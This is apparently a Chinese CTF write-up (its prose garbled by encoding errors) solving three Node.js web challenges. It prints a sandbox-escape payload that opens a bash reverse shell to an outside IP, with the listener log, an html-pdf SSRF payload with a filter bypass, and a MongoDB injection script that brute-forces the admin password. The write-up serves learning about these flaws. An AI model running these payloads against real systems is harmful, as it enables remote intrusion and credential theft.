# å‰è¨€

æ­£å¥½buuctfä¸Šæ”¾äº†é‚£ä¸‰é“jsçš„é¢˜ç›®ï¼Œå°±æ­£å¥½å¤ç°äº†ä¸€ä¸‹ï¼Œå­¦ä¹ å­¦ä¹ ã€‚



# cralwer_z

æœ‰æ³¨å†Œç™»å½•ï¼Œæ›´æ–°ä¸ªäººä¿¡æ¯è¿˜æœ‰çˆ¬è™«çš„åŠŸèƒ½ã€‚ä½†æ˜¯æƒ³ä½¿ç”¨çˆ¬è™«åŠŸèƒ½ä¼šå—åˆ°é™åˆ¶ï¼š

```js
    if (/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/.exec(user.bucket)) {
        return res.json({ message: "Sorry but our remote oss server is under maintenance" });
    } else {
```

å› æ­¤éœ€è¦æ›´æ”¹`user.bucket`ï¼Œä½†æ˜¯æ›´æ”¹ä¹Ÿæœ‰è¿™äº›é™åˆ¶ï¼š

```js
        if (url.protocol != "http:" && url.protocol != "https:") return false;
        if (url.href.includes('oss-cn-beijing.ichunqiu.com') === false) return false;
```



```js
    if (/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/.exec(bucket)) {
        res.redirect(`/user/verify?token=${authToken}`)
    } else {
```

å¿…é¡»åŒ…å«`oss-cn-beijing.ichunqiu.com`çš„è¯ç®€å•ï¼Œæ— è®ºæ˜¯`?a=xxx`è¿˜æ˜¯`#xxxxx`éƒ½å¯ä»¥ã€‚

ä½†æ˜¯æ¥ä¸‹æ¥è¿™ä¸ª`verify`çš„åŠŸèƒ½å°±æ˜¯æ›´æ–°bucketï¼š

```js
    let user = await User.findByPk(req.session.userId);
    const result = await Token.findOne({
        token,
        userId: req.session.userId,
        valid: true
    });
    if (result) {
        
        
            await User.update({
                bucket: user.personalBucket
            }, {
```

éœ€è¦ä¼ å…¥çš„tokenæ˜¯å¯ä»¥æ‰¾åˆ°çš„æ‰å¯ä»¥ã€‚è€ƒè™‘åˆ°æ›´æ–°çš„æ—¶å€™ï¼š

```js
        await User.update({
            affiliation,
            age,
            personalBucket: bucket
        }, {
```

æ˜¯æ›´æ–°çš„`personalBucket`ï¼Œè€Œ`verify`çš„æ—¶å€™æ˜¯æ›´æ–°`bucket`ï¼Œè€Œçˆ¬è™«çˆ¬å–çš„åˆ™æ˜¯`bucket`ï¼›å¦‚æœæƒ³å¯ä»¥æ›´æ–°`bucket`ï¼Œåˆ™å¿…é¡»ä¼ çš„`token`å¯ä»¥æŸ¥è¯¢åˆ°ã€‚

æ­£ç¡®çš„è§£æ³•æ˜¯ï¼Œé¦–å…ˆæ›´æ–°å¯ä»¥åŒ¹é…åˆ°çš„åœ°å€ï¼Œè·å–tokenï¼Œç„¶åå†æ›´æ–°ä¸ºè‡ªå·±çš„urlé‚£é‡Œä¸€æ¬¡ï¼Œç„¶åå†åˆ©ç”¨ç¬¬ä¸€æ¬¡è·å–çš„tokenå»verifyä¸€æ¬¡å³å¯ã€‚

ä½†å®é™…ä¸Šçš„è¯ï¼Œç¬¬ä¸€æ¬¡è·å–çš„tokenä¼šè·³è½¬è¿‡å»ï¼Œè¿™ä¸ªtokenç”¨ä¸€æ¬¡çš„è¯ï¼Œå®ƒçš„validå°±ä¼šä¸ºfalseï¼Œè¿™æ ·çš„è¯æœ€ååˆ©ç”¨åº”è¯¥æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥éœ€è¦ç¬¬ä¸€æ¬¡çš„æ—¶å€™bpæŠ“åŒ…ä¸è®©å®ƒè·³è½¬ï¼Œè¿™æ ·å¾—åˆ°çš„tokenå°±æ˜¯å¯ä»¥ç”¨çš„äº†ã€‚

ä½†å®é™…ä¸Šå¤ç°çš„æ—¶å€™å‘ç°ä¸æŠ“åŒ…ç›´æ¥è·³è½¬ä¹Ÿå¯ä»¥ï¼Œè¿·äº†å¾ˆä¹…å‘ç°è¿™ä¸ªï¼š

```js
    const result = await Token.findOne({
        token,
        userId: req.session.userId,
        valid: true
    });
```

ä¸çŸ¥é“æ˜¯ä¸æ˜¯å‡ºé¢˜äººæ•…æ„çš„ï¼Œåº”è¯¥å†™æˆ`token:token`æ‰å¯¹ï¼Œç›´æ¥`token`å°±æ˜¯ï¼Œå¦‚æœç©¿äº†`token`å°±æ°¸è¿œå¯ä»¥æŸ¥åˆ°æ•°æ®äº†ï¼Œæ‰€ä»¥å‡ºäº†é—®é¢˜ã€‚

rceçš„è¯åˆ©ç”¨https://ha.cker.in/index.php/Article/13563é‡Œé¢çš„å³å¯ã€‚

urlå†™ï¼š`http://118.31.168.198:39777/index.html#.oss-cn-beijing.ichunqiu.com/`å³å¯ã€‚

ç„¶åurlé‚£é‡Œçš„index.htmlå†™åå¼¹shellï¼š

```js
<script>c='constructor';this[c][c]("c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i >& /dev/tcp/118.31.168.198/39876 0>&1'],);console.log(ls.output.toString());")()</script>
```



ç„¶åæŒ‰æ­¥éª¤æ‰“å°±å¯ä»¥äº†ï¼Œæœ€åè¯·æ±‚/bucketå³å¯åå¼¹shellï¼š

```shell
root@iZbp14tgce8absspjkxi3iZ:~# python3 -m http.server 39777
Serving HTTP on 0.0.0.0 port 39777 (http://0.0.0.0:39777/) ...
117.21.200.166 - - [25/Aug/2021 00:02:00] "GET /index.html HTTP/1.1" 200 -
117.21.200.166 - - [25/Aug/2021 00:02:09] "GET /index.html HTTP/1.1" 200 -


root@iZbp14tgce8absspjkxi3iZ:~# nc -lvvp 39876
Listening on [0.0.0.0] (family 0, port 39876)
Connection from [117.21.200.166] port 39876 [tcp/*] accepted (family 2, sport 10556)
bash: cannot set terminal process group (205): Inappropriate ioctl for device
bash: no job control in this shell
app@9a5e3958e052:/app$ cat /flag
cat /flag
flag{ec14c9ee-801c-403d-9fed-b0910b9618b5}
app@9a5e3958e052:/app$

```







# secrets_of_admin

è¿™é¢˜çš„æ€è·¯è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ã€‚å½“æ—¶æ²¡èƒ½åšå‡ºæ¥ä¸»è¦è¿˜æ˜¯å› ä¸º`content`é‚£é‡Œçš„ç»•è¿‡ä¸ä¼šï¼Œè¿˜æ˜¯å¯¹node.jsä¸ç†Ÿæ‚‰å¯¼è‡´çš„ã€‚



åŠŸèƒ½æœ‰ç™»å½•ï¼Œåˆ¶é€ pdfï¼Œ`files`çš„`insert`ï¼Œè¿˜æœ‰é€šè¿‡`checknum`æ¥è¯»æ–‡ä»¶ã€‚

ç™»å½•çš„è¯ï¼Œ`database.js`é‡Œé¢ç»™äº†`admin`å’Œ`e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645`ï¼Œç›´æ¥ç™»å½•å³å¯ã€‚`files`è¡¨å¯ä»¥çŸ¥é“ï¼Œflagåœ¨`superuser`é‚£é‡Œï¼Œä½†æ˜¯`superuser`ä¸èƒ½ç”¨ã€‚é€šè¿‡ä¸‹é¢ä¸‰è¡Œä»£ç ä¹Ÿå¯ä»¥çŸ¥é“ï¼Œéœ€è¦æŠŠ`flag`ç»™`admin`ç”¨æˆ·ã€‚

```js
            let filename = await DB.getFile(token.username, req.params.id)
            if (fs.existsSync(path.join(__dirname , "../files/", filename))){
                return res.send(await readFile(path.join(__dirname , "../files/", filename)));
```



ä½†æ˜¯`/api/files/`åŠŸèƒ½é‚£é‡Œéœ€è¦SSRFã€‚

é€šè¿‡æŸ¥æ‰¾`html-pdf`åº“å‘ç°å®ƒå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼š

> `html-pdf` before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as `request.open("GET","file:///etc/passwd")` will result in a PDF document with the contents of `/etc/passwd`.



å› æ­¤å¯ä»¥åˆ©ç”¨åˆ¶é€ pdfçš„åŠŸèƒ½æ¥å®ç°ssrfï¼ŒæŠŠflagç»™adminç”¨æˆ·ã€‚

```js
<script>
var xhr = new XMLHttpRequest();xhr.open("GET", "http://127.0.0.1:8888/api/files?username=admin&filename=./flag&checksum=123", true);xhr.send();
</script>
```

è€Œä¸”filenameå­—æ®µæ˜¯UNIQUEï¼Œéœ€è¦ä¸èƒ½ç›´æ¥flagï¼Œç”¨./flagã€‚

ä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯è¿™ä¸ªè¿‡æ»¤ï¼š

```js
    if ( content == '' || content.includes('<') || content.includes('>') || content.includes('/') || content.includes('script') || content.includes('on')){
        // even admin can't be trusted right ? :)  
        return res.render('admin', { error: 'Forbidden word ğŸ¤¬'});
    } else {
```



å½“æ—¶è‡ªå·±å°±å¡åœ¨äº†è¿™é‡Œï¼Œä¸çŸ¥é“æ€ä¹ˆç»•è¿‡ã€‚å…³é”®å°±åœ¨äºnode.jsçš„å¼±ç±»å‹å’Œphpçš„å¼±ç±»å‹æœ‰æ‰€ä¸åŒã€‚jsä¸­æ•°ç»„å’Œå­—ç¬¦ä¸²æ‹¼æ¥çš„è¯ï¼Œæ¯”å¦‚`["hello"]+"world"`ï¼Œå¾—åˆ°çš„æ˜¯`helloworld`ï¼Œè€Œphpé‡Œç¡®å®`Arrayworld`ã€‚ä¹Ÿæ˜¯å› ä¸ºæ·±å—phpçš„å½±å“ï¼Œæ‰€ä»¥æ²¡æƒ³åˆ°è¿™é‡Œå¯ä»¥ç”¨æ•°ç»„æ¥ç»•è¿‡ï¼Œè®°å¾—URLç¼–ç ï¼š

```js
http://b34ad16e-b7b2-4eb1-bfc1-8f0840ab5307.node4.buuoj.cn:81/admin

content[]=<script>
var xhr = new XMLHttpRequest();xhr.open("GET", "http://127.0.0.1:8888/api/files?username=admin&filename=./flag&checksum=123", true);xhr.send();
</script>
```

å°±å®ç°äº†SSRFï¼Œå†è®¿é—®`http://b34ad16e-b7b2-4eb1-bfc1-8f0840ab5307.node4.buuoj.cn:81/api/files/123`å³å¯å¾—åˆ°flagã€‚



# Package Manager 2021

çœ‹ä¸€ä¸‹`schema.js`å¯ä»¥çŸ¥é“ç”¨çš„æ˜¯mongodbã€‚

å‘ç°`/auth`å­˜åœ¨SQLæ³¨å…¥ï¼š

```js
router.post('/auth', async (req, res) => {
	let { token } = req.body;
	if (token !== '' && typeof (token) === 'string') {
		if (checkmd5Regex(token)) {
			try {
				let docs = await User.$where(`this.username == "admin" && hex_md5(this.password) == "${token.toString()}"`).exec()
				console.log(docs);
```

å­˜åœ¨ä¸€ä¸ª`checkmd5Regex`çš„wafï¼Œä¸è¿‡å› ä¸ºå†™çš„æœ‰é—®é¢˜ï¼Œæ²¡æœ‰åŠ ä¸Š`^$`ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ï¼š

```js

const checkmd5Regex = (token: string) => {
  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);
}
```

è€Œä¸”æ³¨æ„ä¸€ä¸‹ï¼Œç”¨çš„æ˜¯`==`è€Œä¸æ˜¯`=`ã€‚

æ¥ä¸‹æ¥å°±æ˜¯SQLæ³¨å…¥å‡ºå¯†ç äº†ï¼Œæœ‰ä¸¤ç§æ–¹å¼ã€‚ç¬¬ä¸€ç§å°±æ˜¯æ­£å¸¸çš„å¸ƒå°”æ³¨å…¥ï¼š

```js
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[0]=="a
```

å†™ä¸ªè„šæœ¬è·‘å‡ºæ¥å³å¯ï¼š

```python
import requests
import string

url="http://fa767ade-d4a2-4335-a76b-84bebdea8395.node4.buuoj.cn:81/auth"
headers={
    "Cookie": "session=s:43UCQxzqHneiwEF-JP_ftZ0Aw1upXuCF.t58XyJ4BQ4rmP8Da+VdQzkHtAd1r4EkRUs9h/Zim3os",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Referer": "http://fa767ade-d4a2-4335-a76b-84bebdea8395.node4.buuoj.cn:81/packages/submit",
    "Origin": "http://fa767ade-d4a2-4335-a76b-84bebdea8395.node4.buuoj.cn:81",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Upgrade-Insecure-Requests": "1",
}

flag = ''
for i in range(10000):
    for j in string.printable:
        if j == '"':
            continue
        payload='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'.format(i,j)
        #print(payload)
        data={
            "_csrf":"2PzwJX5n-Y1qH02TLkz3_JXa_OBn2hpgU2G8",
            "token":payload
        }


        r=requests.post(url=url,data=data,headers=headers,allow_redirects=False)
        #print(r.text)
        if "Found. Redirecting to" in r.text:
            #print(payload)
            flag+=j
            print(flag)
            break
"!@#&@&@efefef*@((@))grgregret3r"
"!@#&@&@efefef*@((@))grgregret3r"
```

ç¬¬äºŒç§æ˜¯WMçš„Webå¸ˆå‚…çš„éªšå§¿åŠ¿ï¼Œåªèƒ½è¯´å­¦ä¹ äº†ï¼Œå› ä¸ºå®åœ¨ä¸ä¼šjså‘œå‘œå‘œå‘œï¼š

> MongoDBæ”¯æŒJavascriptè¯­æ³•ã€‚æ‰€ä»¥å¯ä»¥ç”¨jsè¯­æ³•å»æŠ›å‡ºå†…å®¹æ˜¯adminå¯†ç çš„å¼‚å¸¸



```js
_csrf=2PzwJX5n-Y1qH02TLkz3_JXa_OBn2hpgU2G8&token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||
( ()=>{throw Error(this.password)})()=="admin
```



> MongoError: Executor error during find command :: caused by :: Error: !@#&@&@efefef*@((@))grgregret3r : @:1:125 @:1:112





ç™»å½•å³å¯æ‹¿åˆ°flagã€‚å­¦åˆ°äº†å­¦åˆ°äº†ï¼



# æ€»ç»“

æœ‰ç©ºè¿˜æ˜¯å¾—å»è¡¥è¡¥jsã€‚






